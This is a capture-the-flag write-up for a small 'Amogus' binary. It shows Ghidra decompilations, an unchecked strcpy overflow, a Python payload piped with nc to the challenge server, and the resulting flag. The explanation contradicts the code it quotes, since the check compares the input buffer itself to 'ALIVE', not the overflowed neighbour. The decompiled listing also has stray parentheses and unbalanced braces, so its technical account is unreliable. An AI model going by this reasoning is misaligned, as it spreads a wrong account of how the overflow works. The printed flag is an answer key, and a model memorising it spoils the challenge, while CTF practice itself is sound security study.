1. Analyse the file with Ghidra. main() shows this:
```int main(void) {
        long in_FS_OFFSET;
        char local_28[24];
        long local_10;

        local_10 = *(long *)(in_FS_OFFSET + 0x28);

        puts("Welcome to Amogus.\n");
        display();
        puts("Enter your name:\n");

        __isoc99_scanf("%s", local_28);
        gameplay(local_28);

        if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                __stack_chk_fail();  // Stack canary check
        }

        return 0;
}```

gameplay() shows this:
```void gameplay(char *param_1) {
        int iVar1;
        FILE *_stream;
        long in_FS_OFFSET;
        char local_68[16];
        char local_58[16];
        char local_48[64];
        long local_10;

        local_10 = *(long *)(in_FS_OFFSET + 0x28);

        __builtin_strncpy(local_68, "DEAD", 5);
        strcpy(local_58, param_1);
        iVar1 = strcmp(local_58, "ALIVE");

        if (iVar1 == 0) {
                _stream = fopen("flag.txt", "r");

                if (_stream == NULL) {
                printf("Error in opening the flag file. Flag file might be missing :(\n"));
                } else {
                fgets(local_48, 0x2d, _stream);
                puts("How are you still alive?!\n");
                puts(local_48);
                }
        } else {
                iVar1 = strcmp(local_58, "DEAD");

                if (iVar1 != 0) {
                puts("ERROR. ERROR. AMONG US NOT RESPONDING.");
                exit(0);
        }

        puts("You are a crewmate. \n");
        FUN_00401160(1);
        puts("You go to Medbay to finish your tasks.\n");
        FUN_00401160(1);
        puts("Suddenly, you hear a gunshot... The world goes dark. \n");
        FUN_00401160(1);
        puts("GAME OVER. YOU LOST :("));
    }

    if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
        __stack_chk_fail();
    }

    return;
}```

2. Looking at the decompiled code, I noticed this suspicious line:
   ```
   strcpy(local_58, param_1);  
   ```
   `strcpy()` copies user input without any size validation into a 16-byte buffer (`local_58`). This is a classic **buffer overflow** vulnerability.

3. Then, we look at the stack layout to determine where we should overflow into:
```
char local_68[16];  // Initially contains "DEAD"
char local_58[16];  // Your input buffer
char local_48[64];  // Flag storage (unused in the exploit)
```

4. Since the simple approach failed and I saw the unsafe `strcpy()`, I thought about overflowing `local_58` to corrupt adjacent memory. Looking at the stack layout:
   ```
   char local_68[16];  // "DEAD" gets stored here
   char local_58[16];  // Our input buffer
   char local_48[64];  // Flag storage
   ```

5. Since local_58 is right before local_68, I could fill up the entire 16-byte local_58 with random characters, and then overflow "ALIVE\x00" into local_68. If `local_68` (which normally contains "DEAD") gets overwritten with "ALIVE", it might affect the string comparison and trigger the flag condition.

6.Use 16 bytes of "A" to fill up local_58, and include "ALIVE":

```└─$ python -c 'print("A"*16 + "ALIVE\x00")' | nc 43.205.113.100 8292
    Welcome to Amogus.

    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⢀⣀⣤⣤⣤⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀  
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⣼⠟⠉⠉⠉⠉⠉⠉⠉⠙⠻⢶⣄⠀⠀⠀⠀   
            ⣾⡏⠀⠀⠀⠀⠀⠀     ⠙⣷⡀⠀    
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⣸⡟⠀⣠⣶⠛⠛⠛⠛⠛⠛⠳⣦⡀⠀⠘⣿⡄    
    ⠀⠀⠀⠀⠀⠀⠀⠀ ⢠⣿⠁⠀⢹⣿⣦⣀⣀⣀⣀⣀⣠⣼⡇⠀⠀⠸⣷⠀⠀  
    ⠀⠀⠀⠀⠀⠀⠀⠀ ⣼⡏⠀⠀⠀⠉⠛⠿⠿⠿⠿⠛⠋⠁⠀⠀⠀⠀⣿    
            ⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀  ⢻⡇⠀  
            ⣸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   ⢸⡇   
    ⠀⠀⠀⠀⠀⠀⠀ ⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣧⠀  
    ⠀⠀⠀⠀⠀⠀⠀ ⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⠀  
    ⠀⠀⠀⠀⠀⠀⠀⣾⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀  
    ⠀⠀⠀⠀⠀⠀⠀⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ⠀⠀⣿⠀  
    ⠀⠀⠀⠀⠀⠀⢰⣿⠀⠀⠀⠀⣠⡶⠶⠿⠿⠿⠿⢷⣦⠀⠀⠀⠀⠀  ⣿⠀  
    ⠀⠀⣀⣀⣀⠀⣸⡇⠀⠀⠀⠀⣿⡀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀ ⣿⠀ 
    ⣠⡿⠛⠛⠛⠛⠻⠀⠀⠀⠀⠀⢸⣇⠀⠀⠀⠀⠀⠀⣿⠇⠀⠀⠀⠀⠀ ⠀⣿⠀ 
    ⢻⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⡟⠀⠀⢀⣤⣤⣴⣿⠀⠀⠀⠀⠀⠀  ⣿⠀ 
    ⠈⠙⢷⣶⣦⣤⣤⣤⣴⣶⣾⠿⠛⠁⢀⣶⡟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡟⠀  
                ⣿⣆⡀⠀⠀⠀⠀⠀⢀⣠⣴⡾⠃    
                ⠀⠀⠈⠛⠻⢿⣿⣾⣿⡿⠿⠟⠋⠁⠀⠀   
    Enter your name:

    How are you still alive?!

    shaktictf{ch@ng3d_fat3_wh3n_I_s@w_r3dv3nt}```
